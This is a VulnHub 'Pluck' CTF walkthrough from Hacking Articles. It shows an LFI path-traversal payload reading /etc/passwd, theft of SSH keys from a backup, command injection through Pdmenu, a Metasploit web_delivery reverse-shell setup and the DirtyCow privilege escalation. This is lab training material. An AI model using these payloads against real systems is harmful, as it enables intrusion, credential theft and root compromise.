<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Pluck VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-pluck-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-04-04T15:37:33+00:00">April 4, 2017</time><time class="updated" datetime="2025-06-10T20:30:15+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Coming towards another tutorial of vulnhub’s lab challenges “<strong>pluck</strong>” you can download it from <a style="color: #000000;" href="https://www.vulnhub.com/entry/pluck-1,178/"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;">This lab is quite simple this article may help you to solve the task for capturing the flag.</span></p>
<p><span style="color: #000000;"><strong>Let,s Start</strong></span></p>
<p><span style="color: #000000;"><strong>192.168.1.115</strong> is my target IP let enumerate through aggressive scan using NMAP. You can observe its result from the given screenshot.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.115</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EQCS2WTICs4/WOO6LSEodjI/AAAAAAAAPr8/cCosRDJOPw8v4fi03gVoncWD5n6-Xj8JQCLcB/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Use Nikto to dig up more information related to the target</span></p>
<pre class="lang:default decode:true">nikto -h http://192.168.1.115</pre>
<p><span style="color: #000000;"><strong> </strong>Finally, I have got something very remarkable here if you notice the given below image the highlighted text looks like local <strong>file inclusion vulnerability</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Jc6PWw5l4ns/WOO6M9pmGMI/AAAAAAAAPsg/-lAbhNEZ_kUVoQgJsyhpJtt0nr50is12wCLcB/s1600/2.png"/></span></p>
<p><span style="color: #000000;">So when I explore the above-highlighted text in the browser here I got more than enough data. The highlighted text denotes towards some kind of backup script file path.</span></p>
<pre class="lang:default decode:true">http://192.168.1.115/index.php?page=../../../../../../../../etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CYn7yccHk8A/WOO6M17ftgI/AAAAAAAAPsk/L-P69yQpXkYbk6-7-Cvl8Wj5BBbLhsUsACLcB/s1600/3.png"/></span></p>
<p><span style="color: #000000;">When again I walk around it now further I found a tar file for backup.</span></p>
<pre class="lang:default decode:true">http://192.168.1.115/index.php?page=/usr/local/scripts/backup.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-IntwdQbm8Wo/WOO6M0jY7UI/AAAAAAAAPso/D-mLy-yqeAMGf1s1dhGUWSvBXZAtvHiEQCLcB/s1600/4.png"/></span></p>
<p><span style="color: #000000;">A download tar file of backup script, type following command inside the terminal of your Kali Linux.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.115/index.php?page=/backups/backup.tar</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ePb943cDKGo/WOO6NeT-_oI/AAAAAAAAPss/X6qxqZirRMcGRxcHOcyirqnMJs2xDKzkgCLcB/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now type the following command to extract the backup.tar file</span></p>
<pre class="lang:default decode:true">tar –xvf index.php\?page\=%2Fbackups%2Fbackup.tar</pre>
<p><span style="color: #000000;">Inside it, I found the <strong>home</strong> folder which further contains a subfolder for 3 users.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-HwNUkZxpjX4/WOO6NRoXv6I/AAAAAAAAPsw/zH5twDFPQsgSU_w7Gy9VF9I-nqX57nmHACLcB/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Among all 3 users only paul has keys</span></p>
<pre class="lang:default decode:true">cd paul
ls
cd keys
ls</pre>
<p><span style="color: #000000;">So here I found 6 keys, let use one of them for connection.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4v7xcKQykxs/WOO6NvjiLmI/AAAAAAAAPs0/Z4l4-I32Eds9x5OhdRU6IxUzJ73JyobaACLcB/s1600/8.png"/></span></p>
<pre class="lang:default decode:true">ssh -i id_key4 paul@192.168.1.115</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ew_y-nZ5fzs/WOO6N613q_I/AAAAAAAAPs4/VLGjPPoJwYAsj67ljToa_UJU8aCy-7tDwCLcB/s1600/9.png"/></span></p>
<p><span style="color: #000000;">When you will try to connect with the target using ssh simultaneously a new terminal “<strong>Pdmenu</strong>” will pop up. Here I got so many options but I choose <strong>Edit file</strong> option that gave me a prompt to edit any file and it looks like <strong>command injection vulnerability</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-W0ockLYZKjY/WOO6LQRgqNI/AAAAAAAAPsA/sGWSS_9kwPY8jLIDIYdVZ7Rt5atLiaQ3wCLcB/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now load Metasploit framework and type following</span></p>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set target 1
msf exploit (web_delivery)&gt;set payload php/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt;set lhost 192.168.1.15
msf exploit (web_delivery)&gt;set lport 4444
msf exploit (web_delivery)&gt;set srvport 8081
msf exploit (web_delivery)&gt;exploit</pre>
<p><span style="color: #000000;">Now <strong>copy</strong> the generated command <strong>php….5tz’));”</strong> and send it to target</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JfgrwfQm4gY/WOO6LeUd32I/AAAAAAAAPsE/UjMv3ATcxSwbu1Yp7eQQ-TwT0sSru35IwCLcB/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now <strong>paste </strong>above command as shown in the screenshot and <strong>hit enter</strong> which will give you reverse connection at the background inside Metasploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-rQt5-gEmcaQ/WOO6L4dWdmI/AAAAAAAAPsM/4IqODJf1XoghqkdD14Mic9KYIAGVpyt-QCLcB/s1600/12.png"/></span></p>
<p><span style="color: #000000;"><strong>Great!!!</strong> We have got victim’s meterpreter session</span></p>
<pre class="lang:default decode:true">meterpreter&gt;shell</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-_Fo2Fb5wrf8/WOO6L3l3eqI/AAAAAAAAPsI/6D3H2CWL5zEwlhP7_wwrK9k5lufxCnu3gCLcB/s1600/13.png"/></span></p>
<pre class="lang:default decode:true">uname -a</pre>
<p><span style="color: #000000;"><strong> </strong>Now use Dirty cow exploit</span></p>
<p><span style="color: #000000;">Here got the path to download exploit which might be related to it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-UXl3mnT8OeA/WOO6L-gNyOI/AAAAAAAAPsQ/NHJ0P5GTgx0ozflQkVbRwfIFBkXXiJmZwCLcB/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Open this path “<a style="color: #000000;" href="http://www.exploit-db.com/download/40616"><strong>http://www.exploit-db.com/download/40616</strong></a>” in the browser and downloads the exploit for dirty cow vulnerability. I have saved this exploit as <strong>raj</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xUcQFm7FKAI/WOO6McW4l1I/AAAAAAAAPsU/WfuEOPMWtK8YQ-Doq478Px60QUBabQ69gCLcB/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now type the following command to compile your exploit so that it can run successfully inside your Kali Linux.</span></p>
<pre class="lang:default decode:true">gcc shell.c -o raj -pthread</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-JhUxlgRFzc8/WOO6MeNewYI/AAAAAAAAPsY/7c29DbS823suxBWI8Kd2Z0NBpz-ScLzFwCLcB/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now we can run our exploit to achieve root permission and try to capture the flag</span></p>
<pre class="lang:default decode:true">./raj
cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"> <strong>Bravo!!! </strong>We have captured the flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-e4PYvzhA34s/WOO6MdoBd6I/AAAAAAAAPsc/-3MJVHt1iVcsiJ1dfARoUAjcwCjhuvrEgCLcB/s1600/17.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
